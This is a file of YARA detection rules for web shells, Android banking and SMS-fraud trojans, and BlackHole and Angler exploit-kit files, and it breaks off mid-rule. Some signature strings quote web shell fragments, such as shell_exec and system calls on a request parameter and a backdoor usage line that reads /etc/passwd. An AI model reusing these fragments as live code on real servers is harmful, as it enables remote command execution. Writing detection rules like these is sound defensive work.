rule SSC_webshell_jsp_k8cmd {
meta:
description = "Web Shell - file k8cmd.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "b39544415e692a567455ff033a97a682"
strings:
$s2 = "if(request.getSession().getAttribute(\"hehe\").toString().equals(\"hehe\"))" fullword
condition:
all of them
}
rule SSC_webshell_php {
meta:
description = "Semi-Auto-generated  - file webshell.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "e425241b928e992bde43dd65180a4894"
strings:
$s2 = "<die(\"Couldn't Read directory, Blocked!!!\");"
$s3 = "PHP Web Shell"
condition:
all of them
}
rule SSC_WebShell_simple_cmd {
meta:
description = "PHP Webshells Github Archive - file simple_cmd.php"
author = "Florian Roth"
hash = "466a8caf03cdebe07aa16ad490e54744f82e32c2"
strings:
$s1 = "<input type=TEXT name=\"-cmd\" size=64 value=\"<?=$cmd?>\" " fullword
$s2 = "<title>G-Security Webshell</title>" fullword
$s4 = "<? if($cmd != \"\") print Shell_Exec($cmd);?>" fullword
$s6 = "<? $cmd = $_REQUEST[\"-cmd\"];?>" fullword
condition:
1 of them
}
rule SSC_laudanum : webshell {
meta:
description = "Laudanum Injector Tools - file laudanum.php"
author = "Florian Roth"
reference = "http://laudanum.inguardians.com/"
date = "2015-06-22"
hash = "fd498c8b195967db01f68776ff5e36a06c9dfbfe"
strings:
$s1 = "public function __activate()" fullword ascii
$s2 = "register_activation_hook(__FILE__, array('WP_Laudanum', 'activate'));" fullword ascii /* PEStudio Blacklist: strings */
condition:
filesize < 5KB and all of them
}
rule SSC_webshell_r57_1_4_0 {
meta:
description = "Web Shell - file r57.1.4.0.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "574f3303e131242568b0caf3de42f325"
strings:
$s4 = "@ini_set('error_log',NULL);" fullword
$s6 = "$pass='abcdef1234567890abcdef1234567890';" fullword
$s7 = "@ini_restore(\"disable_functions\");" fullword
$s9 = "@ini_restore(\"safe_mode_exec_dir\");" fullword
condition:
all of them
}
rule SSC_MySQL_Web_Interface_Version_0_8_php {
meta:
description = "Semi-Auto-generated  - file MySQL Web Interface Version 0.8.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "36d4f34d0a22080f47bb1cb94107c60f"
strings:
$s0 = "SooMin Kim"
$s1 = "http://popeye.snu.ac.kr/~smkim/mysql"
$s2 = "href='$PHP_SELF?action=dropField&dbname=$dbname&tablename=$tablename"
$s3 = "<th>Type</th><th>&nbspM&nbsp</th><th>&nbspD&nbsp</th><th>unsigned</th><th>zerofi"
condition:
2 of them
}
rule SSC_WebShell_Simple_PHP_backdoor_by_DK {
meta:
description = "PHP Webshells Github Archive - file Simple_PHP_backdoor_by_DK.php"
author = "Florian Roth"
hash = "03f6215548ed370bec0332199be7c4f68105274e"
strings:
$s0 = "<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->" fullword
$s1 = "<!--    http://michaeldaw.org   2006    -->" fullword
$s2 = "Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd" fullword
$s6 = "if(isset($_REQUEST['cmd'])){" fullword
$s8 = "system($cmd);" fullword
condition:
2 of them
}
rule SSC_admin_ad {
meta:
description = "Webshells Auto-generated - file admin-ad.asp"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "e6819b8f8ff2f1073f7d46a0b192f43b"
strings:
$s6 = "<td align=\"center\"> <input name=\"cmd\" type=\"text\" id=\"cmd\" siz"
$s7 = "Response.write\"<a href='\"&url&\"?path=\"&Request(\"oldpath\")&\"&attrib=\"&attrib&\"'><"
condition:
all of them
}
rule SSC_WebShell_webshells_zehir4 {
meta:
description = "Webshells Github Archive - file zehir4"
author = "Florian Roth"
hash = "788928ae87551f286d189e163e55410acbb90a64"
score = 55
strings:
$s0 = "frames.byZehir.document.execCommand(command, false, option);" fullword
$s8 = "response.Write \"<title>ZehirIV --> Powered By Zehir &lt;zehirhacker@hotmail.com"
condition:
1 of them
}
rule SSC_webshell_jsp_IXRbE {
meta:
description = "Web Shell - file IXRbE.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "e26e7e0ebc6e7662e1123452a939e2cd"
strings:
$s0 = "<%if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application"
condition:
all of them
}
rule SSC_Mapin : android
{
meta:
author = "https://twitter.com/plutec_net"
source = "https://koodous.com/"
reference = "http://www.welivesecurity.com/2015/09/22/android-trojan-drops-in-despite-googles-bouncer/"
description = "Mapin trojan, not for droppers"
sample = "7f208d0acee62712f3fa04b0c2744c671b3a49781959aaf6f72c2c6672d53776"
strings:
$a = "138675150963" //GCM id
$b = "res/xml/device_admin.xml"
$c = "Device registered: regId ="
condition:
all of them
}
rule SSC_dropperMapin : android
{
meta:
author = "https://twitter.com/plutec_net"
source = "https://koodous.com/"
reference = "http://www.welivesecurity.com/2015/09/22/android-trojan-drops-in-despite-googles-bouncer/"
description = "This rule detects mapin dropper files"
sample = "7e97b234a5f169e41a2d6d35fadc786f26d35d7ca60ab646fff947a294138768"
sample2 = "bfd13f624446a2ce8dec9006a16ae2737effbc4e79249fd3d8ea2dc1ec809f1a"
strings:
$a = ":Write APK file (from txt in assets) to SDCard sucessfully!"
$b = "4Write APK (from Txt in assets) file to SDCard  Fail!"
$c = "device_admin"
condition:
all of them
}
rule SSC_dropper:realshell android {
meta:
author = "https://twitter.com/plutec_net"
reference = "https://koodous.com/"
source = "https://blog.malwarebytes.org/mobile-2/2015/06/complex-method-of-obfuscation-found-in-dropper-realshell/"
strings:
$b = "Decrypt.malloc.memset.free.pluginSMS_encrypt.Java_com_skymobi_pay_common_util_LocalDataDecrpty_Encrypt.strcpy"
condition:
$b
}
rule SSC_smsfraud2 : android {
meta:
author = "Antonio Snchez https://twitter.com/plutec_net"
reference = "https://koodous.com/"
sample = "0200a454f0de2574db0b58421ea83f0f340bc6e0b0a051fe943fdfc55fea305b"
sample2 = "bff3881a8096398b2ded8717b6ce1b86a823e307c919916ab792a13f2f5333b6"
strings:
$a = "pluginSMS_decrypt"
$b = "pluginSMS_encrypt"
$c = "__dso_handle"
$d = "lib/armeabi/libmylib.soUT"
$e = "]Diok\"3|"
condition:
all of them
}
rule SSC_smsfraud1 : android
{
meta:
author = "Antonio Snchez https://twitter.com/plutec_net"
reference = "https://koodous.com/"
description = "This rule detects a kind of SMSFraud trojan"
sample = "265890c3765d9698091e347f5fcdcf1aba24c605613916820cc62011a5423df2"
sample2 = "112b61c778d014088b89ace5e561eb75631a35b21c64254e32d506379afc344c"
strings:
$a = "E!QQAZXS"
$b = "__exidx_end"
$c = "res/layout/notify_apkinstall.xmlPK"
condition:
all of them
}
rule SSC_genericSMS2 : smsFraud android
{
meta:
author = "https://twitter.com/plutec_net"
reference = "https://koodous.com/"
sample = "1f23524e32c12c56be0c9a25c69ab7dc21501169c57f8d6a95c051397263cf9f"
sample2 = "2cf073bd8de8aad6cc0d6ad5c98e1ba458bd0910b043a69a25aabdc2728ea2bd"
sample3 = "20575a3e5e97bcfbf2c3c1d905d967e91a00d69758eb15588bdafacb4c854cba"
strings:
$a = "NotLeftTriangleEqual=022EC"
$b = "SHA1-Digest: X27Zpw9c6eyXvEFuZfCL2LmumtI="
$c = "_ZNSt12_Vector_baseISsSaISsEE13_M_deallocateEPSsj"
$d = "FBTP2AHR3WKC6LEYON7D5GZXVISMJ4QU"
condition:
all of them
}
rule SSC_genericSMS : smsFraud android
{
meta:
author = "https://twitter.com/plutec_net"
reference = "https://koodous.com/"
sample = "3fc533d832e22dc3bc161e5190edf242f70fbc4764267ca073de5a8e3ae23272"
sample2 = "3d85bdd0faea9c985749c614a0676bb05f017f6bde3651f2b819c7ac40a02d5f"
strings:
$a = "SHA1-Digest: +RsrTx5SNjstrnt7pNaeQAzY4kc="
$b = "SHA1-Digest: Rt2oRts0wWTjffGlETGfFix1dfE="
$c = "http://image.baidu.com/wisebrowse/index?tag1=%E6%98%8E%E6%98%9F&tag2=%E5%A5%B3%E6%98%8E%E6%98%9F&tag3=%E5%85%A8%E9%83%A8&pn=0&rn=10&fmpage=index&pos=magic#/channel"
$d = "pitchfork=022D4"
condition:
all of them
}
rule SSC_tachi : android
{
meta:
author = "https://twitter.com/plutec_net"
source = "https://analyst.koodous.com/rulesets/1332"
description = "This rule detects tachi apps (not all malware)"
sample = "10acdf7db989c3acf36be814df4a95f00d370fe5b5fda142f9fd94acf46149ec"
strings:
$a = "svcdownload"
$xml_1 = "<config>"
$xml_2 = "<apptitle>"
$xml_3 = "<txinicio>"
$xml_4 = "<txiniciotitulo>"
$xml_5 = "<txnored>"
$xml_6 = "<txnoredtitulo>"
$xml_7 = "<txnoredretry>"
$xml_8 = "<txnoredsalir>"
$xml_9 = "<laurl>"
$xml_10 = "<txquieresalir>"
$xml_11 = "<txquieresalirtitulo>"
$xml_12 = "<txquieresalirsi>"
$xml_13 = "<txquieresalirno>"
$xml_14 = "<txfiltro>"
$xml_15 = "<txfiltrourl>"
$xml_16 = "<posicion>"
condition:
$a and 4 of ($xml_*)
}
rule SSC_SlemBunk : android
{
meta:
description = "Rule to detect trojans imitating banks of North America, Eurpope and Asia"
author = "@plutec_net"
sample = "e6ef34577a75fc0dc0a1f473304de1fc3a0d7d330bf58448db5f3108ed92741b"
source = "https://www.fireeye.com/blog/threat-research/2015/12/slembunk_an_evolvin.html"
strings:
$a = "#intercept_sms_start"
$b = "#intercept_sms_stop"
$c = "#block_numbers"
$d = "#wipe_data"
$e = "Visa Electron"
condition:
all of them
}
rule SSC_marcher2
{
meta:
author = "Antonio S. <asanchez@koodous.com>"
source = "https://analyst.koodous.com/rulesets/890"
strings:
$a = "HDNRQ2gOlm"
$b = "lElvyohc9Y1X+nzVUEjW8W3SbUA"
condition:
all of them
}
rule SSC_marcher1
{
meta:
author = "Antonio S. <asanchez@koodous.com>"
source = "https://analyst.koodous.com/rulesets/890"
description = "This rule detects is to detect a type of banking malware"
sample = "33b1a9e4a1591c1a39fdd5295874e365dbde9448098254a938525385498da070"
strings:
$a = "cmVudCYmJg=="
$b = "dXNzZCYmJg=="
condition:
all of them
}
rule SSC_marcher3
{
meta:
author = "Antonio S. <asanchez@koodous.com>"
source = "https://analyst.koodous.com/rulesets/890"
sample1 = "087710b944c09c3905a5a9c94337a75ad88706587c10c632b78fad52ec8dfcbe"
sample2 = "fa7a9145b8fc32e3ac16fa4a4cf681b2fa5405fc154327f879eaf71dd42595c2"
strings:
$a = "certificado # 73828394"
$b = "A compania TMN informa que o vosso sistema Android tem vulnerabilidade"
condition:
all of them
}
rule SSC_marcher_v2
{
meta:
description = "This rule detects a new variant of Marcher"
sample = "27c3b0aaa2be02b4ee2bfb5b26b2b90dbefa020b9accc360232e0288ac34767f"
author = "Antonio S. <asanchez@koodous.com>"
source = "https://analyst.koodous.com/rulesets/1301"
strings:
$a = /assets\/[a-z]{1,12}.datPK/
$b = "mastercard_img"
$c = "visa_verifed"
condition:
all of them
}
rule SSC_Dendroid : android
{
meta:
author = "https://twitter.com/jsmesa"
reference = "https://koodous.com/"
description = "Dendroid RAT"
strings:
$s1 = "/upload-pictures.php?"
$s2 = "Opened Dialog:"
$s3 = "com/connect/MyService"
$s4 = "android/os/Binder"
$s5 = "android/app/Service"
condition:
all of them
}
rule SSC_Dendroid_3 : android
{
meta:
author = "https://twitter.com/jsmesa"
reference = "https://koodous.com/"
description = "Dendroid evidences via ServiceReceiver"
strings:
$1 = "ServiceReceiver"
$2 = "Dendroid"
condition:
all of them
}
rule SSC_Dendroid_2 : android
{
meta:
author = "https://twitter.com/jsmesa"
reference = "https://koodous.com/"
description = "Dendroid evidences via Droidian service"
strings:
$a = "Droidian"
$b = "DroidianService"
condition:
all of them
}
rule SSC_blackhole_basic :  EK
{
strings:
$a = /\.php\?\.*\?\:[a-zA-Z0-9\:]{6,}\&\.*\?\&/
condition:
$a
}
rule SSC_blackhole2_htm : EK
{
meta:
author = "Josh Berry"
date = "2016-06-27"
description = "BlackHole2 Exploit Kit Detection"
hash0 = "92e21e491a90e24083449fd906515684"
hash1 = "98b302a504a7ad0e3515ab6b96d623f9"
hash2 = "a91d885ef4c4a0d16c88b956db9c6f43"
hash3 = "d8336f7ae9b3a4db69317aea105f49be"
hash4 = "eba5daf0442dff5b249274c99552177b"
hash5 = "02d8e6daef5a4723621c25cfb766a23d"
hash6 = "dadf69ce2124283a59107708ffa9c900"
hash7 = "467199178ac940ca311896c7d116954f"
hash8 = "17ab5b85f2e1f2b5da436555ea94f859"
sample_filetype = "js-html"
yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
strings:
$string0 = ">links/</a></td><td align"
$string1 = ">684K</td><td>"
$string2 = "> 36K</td><td>"
$string3 = "move_logs.php"
$string4 = "files/"
$string5 = "cron_updatetor.php"
$string6 = ">12-Sep-2012 23:45  </td><td align"
$string7 = ">  - </td><td>"
$string8 = "cron_check.php"
$string9 = "-//W3C//DTD HTML 3.2 Final//EN"
$string10 = "bhadmin.php"
$string11 = ">21-Sep-2012 15:25  </td><td align"
$string12 = ">data/</a></td><td align"
$string13 = ">3.3K</td><td>"
$string14 = "cron_update.php"
condition:
14 of them
}
rule SSC_blackhole2_htm12 : EK
{
meta:
author = "Josh Berry"
date = "2016-06-27"
description = "BlackHole2 Exploit Kit Detection"
hash0 = "0d3acb5285cfe071e30be051d2aaf28a"
hash1 = "6f27377115ba5fd59f007d2cb3f50b35"
hash2 = "f7ffe1fd1a57d337a04d3c777cddc065"
hash3 = "06997228f2769859ef5e4cd8a454d650"
hash4 = "11062eea9b7f2a2675c1e60047e8735c"
hash0 = "0d3acb5285cfe071e30be051d2aaf28a"
hash2 = "f7ffe1fd1a57d337a04d3c777cddc065"
hash7 = "4ec720cfafabd1c9b1034bb82d368a30"
hash8 = "ecd7d11dc9bb6ee842e2a2dce56edc6f"
sample_filetype = "js-html"
yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
strings:
$string0 = "  <title>Index of /data</title>"
$string1 = "<tr><th colspan"
$string2 = "</body></html>"
$string3 = "> 20K</td><td>"
$string4 = "/icons/layout.gif"
$string5 = " <body>"
$string6 = ">Name</a></th><th><a href"
$string7 = ">spn.jar</a></td><td align"
$string8 = ">spn2.jar</a></td><td align"
$string9 = " <head>"
$string10 = "-//W3C//DTD HTML 3.2 Final//EN"
$string11 = "> 10K</td><td>"
$string12 = ">7.9K</td><td>"
$string13 = ">Size</a></th><th><a href"
$string14 = "><hr></th></tr>"
condition:
14 of them
}
rule SSC_blackhole2_htm8 : EK
{
meta:
author = "Josh Berry"
date = "2016-06-27"
description = "BlackHole2 Exploit Kit Detection"
hash0 = "3f47452c1e40f68160beff4bb2a3e5f4"
hash1 = "1e2ba0176787088e3580dfce0245bc16"
hash2 = "1c78d96bb8d8f8a71294bc1e6d374b0f"
hash3 = "f5e16a6cd2c2ac71289aaf1c087224ee"
hash2 = "1c78d96bb8d8f8a71294bc1e6d374b0f"
hash0 = "3f47452c1e40f68160beff4bb2a3e5f4"
hash2 = "1c78d96bb8d8f8a71294bc1e6d374b0f"
hash7 = "6702efdee17e0cd6c29349978961d9fa"
hash8 = "287dca9469c8f7f0cb6e5bdd9e2055cd"
sample_filetype = "js-html"
yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
strings:
$string0 = ">Description</a></th></tr><tr><th colspan"
$string1 = ">Name</a></th><th><a href"
$string2 = "main.js"
$string3 = "datepicker.js"
$string4 = "form.js"
$string5 = "<address>Apache/2.2.15 (CentOS) Server at online-moo-viii.net Port 80</address>"
$string6 = "wysiwyg.js"
condition:
6 of them
}
rule SSC_blackhole2_htm3 : EK
{
meta:
author = "Josh Berry"
date = "2016-06-27"
description = "BlackHole2 Exploit Kit Detection"
hash0 = "018ef031bc68484587eafeefa66c7082"
sample_filetype = "js-html"
yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
strings:
$string0 = "/download.php"
$string1 = "./files/fdc7aaf4a3 md5 is 3169969e91f5fe5446909bbab6e14d5d"
$string2 = "321e774d81b2c3ae"
$string3 = "/files/new00010/554-0002.exe md5 is 8a497cf4ffa8a173a7ac75f0de1f8d8b"
$string4 = "./files/3fa7bdd7dc md5 is 8a497cf4ffa8a173a7ac75f0de1f8d8b"
$string5 = "1603256636530120915 md5 is 425ebdfcf03045917d90878d264773d2"
condition:
3 of them
}
rule SSC_blackhole2_pdf : EK PDF
{
meta:
author = "Josh Berry"
date = "2016-06-27"
description = "BlackHole2 Exploit Kit Detection"
hash0 = "d1e2ff36a6c882b289d3b736d915a6cc"
sample_filetype = "pdf"
yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
strings:
$string0 = "/StructTreeRoot 5 0 R/Type/Catalog>>"
$string1 = "0000036095 00000 n"
$string2 = "http://www.xfa.org/schema/xfa-locale-set/2.1/"
$string3 = "subform[0].ImageField1[0])/Subtype/Widget/TU(Image Field)/Parent 22 0 R/F 4/P 8 0 R/T<FEFF0049006D00"
$string4 = "0000000026 65535 f"
$string5 = "0000029039 00000 n"
$string6 = "0000029693 00000 n"
$string7 = "%PDF-1.6"
$string8 = "27 0 obj<</Subtype/Type0/DescendantFonts 28 0 R/BaseFont/KLGNYZ"
$string9 = "0000034423 00000 n"
$string10 = "0000000010 65535 f"
$string11 = ">stream"
$string12 = "/Pages 2 0 R%/StructTreeRoot 5 0 R/Type/Catalog>>"
$string13 = "19 0 obj<</Subtype/Type1C/Length 23094/Filter/FlateDecode>>stream"
$string14 = "0000003653 00000 n"
$string15 = "0000000023 65535 f"
$string16 = "0000028250 00000 n"
$string17 = "iceRGB>>>>/XStep 9.0/Type/Pattern/TilingType 2/YStep 9.0/BBox[0 0 9 9]>>stream"
$string18 = "<</Root 1 0 R>>"
condition:
18 of them
}
rule SSC_blackhole2_htm6 : EK
{
meta:
author = "Josh Berry"
date = "2016-06-27"
description = "BlackHole2 Exploit Kit Detection"
hash0 = "a5f94d7bdeb88b57be67132473e48286"
hash1 = "2e72a317d07aa1603f8d138787a2c582"
hash2 = "9440d49e1ed0794c90547758ef6023f7"
hash3 = "58265fc893ed5a001e3a7c925441298c"
hash2 = "9440d49e1ed0794c90547758ef6023f7"
hash0 = "a5f94d7bdeb88b57be67132473e48286"
hash2 = "9440d49e1ed0794c90547758ef6023f7"
hash7 = "95c6462d0f21181c5003e2a74c8d3529"
hash8 = "9236e7f96207253b4684f3497bcd2b3d"
sample_filetype = "js-html"
yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
strings:
$string0 = "uniq1.png"
$string1 = "edit.png"
$string2 = "left.gif"
$string3 = "infin.png"
$string4 = "outdent.gif"
$string5 = "exploit.gif"
$string6 = "sem_g.png"
$string7 = "Index of /library/templates/img"
$string8 = "uniq1.png"
condition:
8 of them
}
rule SSC_blackhole2_htm5 : EK
{
meta:
author = "Josh Berry"
date = "2016-06-27"
description = "BlackHole2 Exploit Kit Detection"
hash0 = "fccb8f71663620a5a8b53dcfb396cfb5"
hash1 = "a09bcf1a1bdabe4e6e7e52e7f8898012"
hash2 = "40db66bf212dd953a169752ba9349c6a"
hash3 = "25a87e6da4baa57a9d6a2cdcb2d43249"
hash4 = "6f4c64a1293c03c9f881a4ef4e1491b3"
hash0 = "fccb8f71663620a5a8b53dcfb396cfb5"
hash2 = "40db66bf212dd953a169752ba9349c6a"
hash7 = "4bdfff8de0bb5ea2d623333a4a82c7f9"
hash8 = "b43b6a1897c2956c2a0c9407b74c4232"
sample_filetype = "js-html"
yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
strings:
$string0 = "ruleEdit.php"
$string1 = "domains.php"
$string2 = "menu.php"
$string3 = "browsers_stat.php"
$string4 = "Index of /library/templates"
$string5 = "/icons/unknown.gif"
$string6 = "browsers_bstat.php"
$string7 = "oses_stat.php"
$string8 = "exploits_bstat.php"
$string9 = "block_config.php"
$string10 = "threads_bstat.php"
$string11 = "browsers_bstat.php"
$string12 = "settings.php"
condition:
12 of them
}
rule SSC_blackhole2_htm10 : EK
{
meta:
author = "Josh Berry"
date = "2016-06-27"
description = "BlackHole2 Exploit Kit Detection"
hash0 = "83704d531c9826727016fec285675eb1"
hash1 = "103ef0314607d28b3c54cd07e954cb25"
hash2 = "16c002dc45976caae259d7cabc95b2c3"
hash3 = "fd84d695ac3f2ebfb98d3255b3a4e1de"
hash4 = "c7b417a4d650c72efebc2c45eefbac2a"
hash5 = "c3c35e465e316a71abccca296ff6cd22"
hash2 = "16c002dc45976caae259d7cabc95b2c3"
hash7 = "10ce7956266bfd98fe310d7568bfc9d0"
hash8 = "60024caf40f4239d7e796916fb52dc8c"
sample_filetype = "js-html"
yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
strings:
$string0 = "</body></html>"
$string1 = "/icons/back.gif"
$string2 = ">373K</td><td>"
$string3 = "/icons/unknown.gif"
$string4 = ">Last modified</a></th><th><a href"
$string5 = "tmp.gz"
$string6 = ">tmp.gz</a></td><td align"
$string7 = "nbsp;</td><td align"
$string8 = "</table>"
$string9 = ">  - </td><td>"
$string10 = ">filefdc7aaf4a3</a></td><td align"
$string11 = ">19-Sep-2012 07:06  </td><td align"
$string12 = "><img src"
$string13 = "file3fa7bdd7dc"
$string14 = "  <title>Index of /files</title>"
$string15 = "0da49e042d"
condition:
15 of them
}
rule SSC_blackhole2_htm4 : EK
{
meta:
author = "Josh Berry"
date = "2016-06-27"
description = "BlackHole2 Exploit Kit Detection"
hash0 = "926429bf5fe1fbd531eb100fc6e53524"
hash1 = "7b6cdc67077fc3ca75a54dea0833afe3"
hash2 = "82f108d4e6f997f8fc4cc02aad02629a"
hash3 = "bd819c3714dffb5d4988d2f19d571918"
hash4 = "9bc9f925f60bd8a7b632ae3a6147cb9e"
hash0 = "926429bf5fe1fbd531eb100fc6e53524"
hash2 = "82f108d4e6f997f8fc4cc02aad02629a"
hash7 = "386cb76d46b281778c8c54ac001d72dc"
hash8 = "0d95c666ea5d5c28fca5381bd54304b3"
sample_filetype = "js-html"
yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
strings:
$string0 = "words.dat"
$string1 = "/icons/back.gif"
$string2 = "data.dat"
$string3 = "files.php"
$string4 = "js.php"
$string5 = "template.php"
$string6 = "kcaptcha"
$string7 = "/icons/blank.gif"
$string8 = "java.dat"
condition:
8 of them
}
rule SSC_blackhole2_jar : EK
{
meta:
author = "Josh Berry"
date = "2016-06-27"
description = "BlackHole2 Exploit Kit Detection"
hash0 = "86946ec2d2031f2b456e804cac4ade6d"
sample_filetype = "unknown"
yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
strings:
$string0 = "k0/3;N"
$string1 = "g:WlY0"
$string2 = "(ww6Ou"
$string3 = "SOUGX["
$string4 = "7X2ANb"
$string5 = "r8L<;zYH)"
$string6 = "fbeatbea/fbeatbee.classPK"
$string7 = "fbeatbea/fbeatbec.class"
$string8 = "fbeatbea/fbeatbef.class"
$string9 = "fbeatbea/fbeatbef.classPK"
$string10 = "fbeatbea/fbeatbea.class"
$string11 = "fbeatbea/fbeatbeb.classPK"
$string12 = "nOJh-2"
$string13 = "[af:Fr"
condition:
13 of them
}
rule SSC_blackhole2_css : EK
{
meta:
author = "Josh Berry"
date = "2016-06-27"
description = "BlackHole2 Exploit Kit Detection"
hash0 = "9664a16c65782d56f02789e7d52359cd"
sample_filetype = "js-html"
yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
strings:
$string1 = "background:url('%%?a=img&img=countries.gif')"
$string2 = "background:url('%%?a=img&img=exploit.gif')"
$string3 = "background:url('%%?a=img&img=oses.gif')"
$string4 = "background:url('%%?a=img&img=browsers.gif')"
$string5 = "background:url('%%?a=img&img=edit.png')"
$string6 = "background:url('%%?a=img&img=add.png')"
$string7 = "background:url('%%?a=img&img=accept.png')"
$string8 = "background:url('%%?a=img&img=del.png')"
$string9 = "background:url('%%?a=img&img=stat.gif')"
condition:
7 of them
}
rule SSC_blackhole2_htm11 : EK
{
meta:
author = "Josh Berry"
date = "2016-06-27"
description = "BlackHole2 Exploit Kit Detection"
hash0 = "e89b56df597688c489f06a0a6dd9efed"
hash1 = "06ba331ac5ae3cd1986c82cb1098029e"
hash2 = "a899dedb50ad81d9dbba660747828c7b"
hash3 = "7cbb58412554327fe8b643204a046e2b"
hash2 = "a899dedb50ad81d9dbba660747828c7b"
hash0 = "e89b56df597688c489f06a0a6dd9efed"
hash2 = "a899dedb50ad81d9dbba660747828c7b"
hash7 = "530d31a0c45b79c1ee0c5c678e242c02"
hash2 = "a899dedb50ad81d9dbba660747828c7b"
sample_filetype = "js-html"
yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
strings:
$string0 = "></th><th><a href"
$string1 = "/icons/back.gif"
$string2 = ">Description</a></th></tr><tr><th colspan"
$string3 = "nbsp;</td><td align"
$string4 = "nbsp;</td></tr>"
$string5 = ">  - </td><td>"
$string6 = "-//W3C//DTD HTML 3.2 Final//EN"
$string7 = "<h1>Index of /dummy</h1>"
$string8 = ">Size</a></th><th><a href"
$string9 = " </head>"
$string10 = "/icons/blank.gif"
$string11 = "><hr></th></tr>"
condition:
11 of them
}
rule SSC_blackhole1_jar
{
meta:
author = "Josh Berry"
date = "2016-06-26"
description = "BlackHole1 Exploit Kit Detection"
hash0 = "724acccdcf01cf2323aa095e6ce59cae"
sample_filetype = "unknown"
yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
strings:
$string0 = "Created-By: 1.6.0_18 (Sun Microsystems Inc.)"
$string1 = "workpack/decoder.classmQ]S"
$string2 = "workpack/decoder.classPK"
$string3 = "workpack/editor.classPK"
$string4 = "xmleditor/GUI.classmO"
$string5 = "xmleditor/GUI.classPK"
$string6 = "xmleditor/peers.classPK"
$string7 = "v(SiS]T"
$string8 = ",R3TiV"
$string9 = "META-INF/MANIFEST.MFPK"
$string10 = "xmleditor/PK"
$string11 = "Z[Og8o"
$string12 = "workpack/PK"
condition:
12 of them
}
rule SSC_blackhole2_jar2 : EK
{
meta:
author = "Josh Berry"
date = "2016-06-27"
description = "BlackHole2 Exploit Kit Detection"
hash0 = "add1d01ba06d08818ff6880de2ee74e8"
sample_filetype = "unknown"
yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
strings:
$string0 = "6_O6d09"
$string1 = "juqirvs.classPK"
$string2 = "hw.classPK"
$string3 = "a.classPK"
$string4 = "w.classuS]w"
$string5 = "w.classPK"
$string6 = "YE}0vCZ"
$string7 = "v)Q,Ff"
$string8 = "%8H%t("
$string9 = "hw.class"
$string10 = "a.classmV"
$string11 = "2CniYFU"
$string12 = "juqirvs.class"
condition:
12 of them
}
rule SSC_blackhole2_jar3 : EK
{
meta:
author = "Josh Berry"
date = "2016-06-27"
description = "BlackHole2 Exploit Kit Detection"
hash0 = "c7abd2142f121bd64e55f145d4b860fa"
sample_filetype = "unknown"
yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
strings:
$string0 = "69/sj]]o"
$string1 = "GJk5Nd"
$string2 = "vcs.classu"
$string3 = "T<EssB"
$string4 = "1vmQmQ"
$string5 = "Kf1Ewr"
$string6 = "c$WuuuKKu5"
$string7 = "m.classPK"
$string8 = "chcyih.classPK"
$string9 = "hw.class"
$string10 = "f';;;;{"
$string11 = "vcs.classPK"
$string12 = "Vbhf_6"
condition:
12 of them
}
rule SSC_angler_flash : EK
{
meta:
author = "Josh Berry"
date = "2016-06-26"
description = "Angler Exploit Kit Detection"
hash0 = "8081397c30b53119716c374dd58fc653"
sample_filetype = "unknown"
yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
strings:
$string0 = "(9OOSp"
$string1 = "r$g@ 0'[A"
$string2 = ";R-1qTP"
$string3 = "xwBtR4"
$string4 = "YbVjxp"
$string5 = "ddgXkF"
$string6 = ")n'URF"
$string7 = "vAzq@W"
$string8 = "rOkX$6m<"
$string9 = "@@DB}q "
$string10 = "TiKV'iV"
$string11 = "538x;B"
$string12 = "9pEM{d"
$string13 = ".SIy/O"
$string14 = "ER<Gu,"
condition:
14 of them
}
rule SSC_angler_flash5 : EK
{
meta:
author = "Josh Berry"
date = "2016-06-26"
description = "Angler Exploit Kit Detection"
hash0 = "9f809272e59ee9ecd71093035b31eec6"
sample_filetype = "unknown"
yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
strings:
$string0 = "0k%2{u"
$string1 = "\\Pb@(R"
$string2 = "ys)dVI"
$string3 = "tk4_y["
$string4 = "LM2Grx"
$string5 = "n}s5fb"
$string6 = "jT Nx<hKO"
$string7 = "5xL>>}"
$string8 = "S%,1{b"
$string9 = "C'3g7j"
$string10 = "}gfoh]"
$string11 = ",KFVQb"
$string12 = "LA;{Dx"
condition:
12 of them
}
rule SSC_angler_flash4 : EK
{
meta:
author = "Josh Berry"
date = "2016-06-26"
description = "Angler Exploit Kit Detection"
hash0 = "dbb3f5e90c05602d92e5d6e12f8c1421"
sample_filetype = "unknown"
yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
strings:
$string0 = "_u;cwD;"
$string1 = "lhNp74"
$string2 = "Y0GQ%v"
$string3 = "qjqCb,nx"
$string4 = "vn{l{Wl"
$string5 = "5j5jz5"
$string6 = "a3EWwhM"
$string7 = "hVJb/4Aut"
$string8 = ",lm4v,"
$string9 = ",6MekS"
$string10 = "YM.mxzO"
$string11 = ";6 -$E"
$string12 = "QA%: fy"
$string13 = "<@{qvR"
$string14 = "b9'$'6l"
$string15 = ",x:pQ@-"
$string16 = "2Dyyr9"
condition:
16 of them
}
rule SSC_AnglerEKredirector : EK
{
meta:
description = "Angler Exploit Kit Redirector"
ref = "http://blog.xanda.org/2015/08/28/yara-rule-for-angler-ek-redirector-js/"
